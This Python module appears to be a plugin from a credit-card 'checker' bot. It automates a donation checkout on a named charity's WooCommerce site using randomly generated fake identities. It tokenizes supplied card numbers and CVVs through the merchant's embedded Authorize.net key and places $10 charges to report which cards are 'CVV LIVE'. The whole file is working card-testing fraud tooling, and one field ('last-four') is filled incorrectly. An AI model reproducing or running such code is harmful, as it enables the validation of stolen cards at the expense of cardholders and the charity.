import random
import re
import uuid
import requests
import urllib
import base64
from py_adyen_encrypt import encryptor
from .userinfo import RandUser
from mills.plugins.checkers.funcs.rand_user import random_user_api
from mills.plugins._helpers.tools import find_between


def cleanhtml(raw_html):
    CLEANR = re.compile('<.*?>') 
    cleantext = re.sub(CLEANR, '', raw_html)
    return cleantext



def auth_one(r, rand_user):
    xreq_head = {'x-requested-with': 'XMLHttpRequest'}
    a = r.get('https://forceblueteam.org/product/donate/')
    nonce = find_between(a.text,'"nonce":"','"')
    if not a:return
    b_data = {
'attribute_pa_donation-amount': 'enter-amount',
'nyp': '10.00',
'update-price': '',
'_nypnonce': '',
'quantity': '1',
'add-to-cart': '117',
'product_id': '117',
'variation_id': '118',
}

    b = r.post('https://forceblueteam.org/product/donate/',b_data)
    if not b:return

    c_data = {
'security': nonce,
'action': 'wpmenucart_ajax',
}

    c = r.post('https://forceblueteam.org/wp-admin/admin-ajax.php', c_data, headers = xreq_head)
    if not c:return


    d = r.get('https://forceblueteam.org/checkout/')
    subscription_nonce = find_between(d.text, 'subscription_nonce" value="','"')
    wp_nonce = find_between(d.text, 'woocommerce-process-checkout-nonce" value="','"')
    nonce = find_between(d.text, 'update_order_review_nonce":"','"')

    f_data = {
'action': 'fue_wc_set_cart_email',
'email': rand_user['email'],
'first_name': rand_user['first_name'],
'last_name': rand_user['last_name'],
}


    f = r.post('https://forceblueteam.org/wp-admin/admin-ajax.php',f_data, headers = xreq_head)
    if not f:return


    i_data = {
'security': nonce,
'payment_method': 'authorize_net_cim_credit_card',
'country': 'US',
'state': rand_user['state'],
'postcode': rand_user['zip'],
'city': rand_user['city'],
'address': rand_user['street'],
'address_2': '',
's_country': 'US',
's_state': rand_user['state'],
's_postcode': rand_user['zip'],
's_city': rand_user['city'],
's_address': rand_user['street'],
's_address_2': '',
'has_full_address': 'true',
'post_data': f'billing_first_name={rand_user["first_name"]}&billing_last_name={rand_user["last_name"]}&billing_company=&billing_country=US&billing_address_1={rand_user["street"].replace(" ","%20")}&billing_address_2=&billing_city={rand_user["city"].replace(" ","%20")}&billing_state={rand_user["state"].replace(" ","%20")}&billing_postcode={rand_user["zip"]}&billing_phone={rand_user["phone"]}&billing_email={rand_user["email"]}&account_password=&payment_method=authorize_net_cim_credit_card&wc-authorize-net-cim-credit-card-expiry=&wc-authorize-net-cim-credit-card-payment-nonce=&wc-authorize-net-cim-credit-card-payment-descriptor=&wc-authorize-net-cim-credit-card-last-four=&wc-authorize-net-cim-credit-card-card-type=&terms-field=1&subscription_nonce={subscription_nonce}&woocommerce-process-checkout-nonce={wp_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
}


    i = r.post('https://forceblueteam.org/?wc-ajax=update_order_review', i_data, headers = xreq_head)
    if not i:return
    return subscription_nonce,wp_nonce


def auth_two(cc, mes, ano, cvv, r, rand_user, subscription_nonce, wp_nonce):
    j_data = {
    "securePaymentContainerRequest": {
        "merchantAuthentication": {
            "name": "76pfFT8f",
            "clientKey": "54769n9DNqpKwv39XD3ApWUGdwTa3529juQkuMQFetRVe65sD4754EnwwwTu85X5"
        },
        "data": {
            "type": "TOKEN",
            "id": str(uuid.uuid4()),
            "token": {
                "cardNumber": cc,
                "expirationDate": mes + ano,
                "cardCode": cvv,
                "zip": rand_user["zip"],
                "fullName": rand_user["first_name"]
            }
        }
    }
}
    j = r.post('https://api2.authorize.net/xml/v1/request.api', json = j_data)
    val = find_between(j.text, 'dataValue":"','"')
    if not val:
        return "ERROR WHILE GETTING TOKEN" , "❌", 'DECLINED'
    k_data = {
'billing_first_name': rand_user['first_name'],
'billing_last_name': rand_user['last_name'],
'billing_company': '',
'billing_country': 'US',
'billing_address_1': rand_user['street'],
'billing_address_2': '',
'billing_city': rand_user['city'],
'billing_state': rand_user['state'],
'billing_postcode': rand_user['zip'],
'billing_phone': rand_user['phone'],
'billing_email': rand_user["email"],
'account_password': '',
'payment_method': 'authorize_net_cim_credit_card',
'wc-authorize-net-cim-credit-card-expiry': f'{mes} / {ano}',
'wc-authorize-net-cim-credit-card-payment-nonce': val,
'wc-authorize-net-cim-credit-card-payment-descriptor': 'COMMON.ACCEPT.INAPP.PAYMENT',
'wc-authorize-net-cim-credit-card-last-four': cc[:-4],
'wc-authorize-net-cim-credit-card-card-type': 'mastercard',
'terms': 'on',
'terms-field': '1',
'subscription_nonce': subscription_nonce,
'woocommerce-process-checkout-nonce': wp_nonce,
'_wp_http_referer': '/?wc-ajax=update_order_review',
}

    k = r.post('https://forceblueteam.org/?wc-ajax=checkout', k_data, headers= {'x-requested-with': 'XMLHttpRequest'})
    k_json = k.json()
    if k_json['result'] == 'success':
        return  "CHARGED $10", "✅", 'CVV LIVE'
    else:
        mess = cleanhtml(k_json['messages']).strip()
        r_respo = mess if mess else "DECLINED / UNKNOWN ERROR"
        return r_respo, "❌", 'DECLINED'


